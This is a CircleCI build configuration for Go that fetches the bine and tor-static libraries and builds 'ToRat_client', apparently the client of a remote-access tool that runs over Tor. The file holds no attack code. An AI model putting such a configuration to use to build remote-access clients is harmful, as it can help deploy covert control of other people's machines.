
# Golang CircleCI 2.0 configuration file
#
# Check https://circleci.com/docs/2.0/language-go/ for more details
version: 2
jobs:
  build:
    docker:
      - image: circleci/golang
    working_directory: /go/src/github.com/cretz/
    steps:
      - checkout
      
      - run: sudo apt install build-essential libtool autopoint -y
      - run: go get -u -v github.com/cretz/bine
      - run: git clone --recursive https://github.com/cretz/tor-static.git
      - run: ls /go/src/github.com/cretz/tor-static
      - run: go run /go/src/github.com/cretz/tor-static/build.go build-all
      - run: go get -u -v github.com/lu4p/ToRat_client
      - run: cd /go/src/github.com/lu4p/ToRat_client
      - run: go build
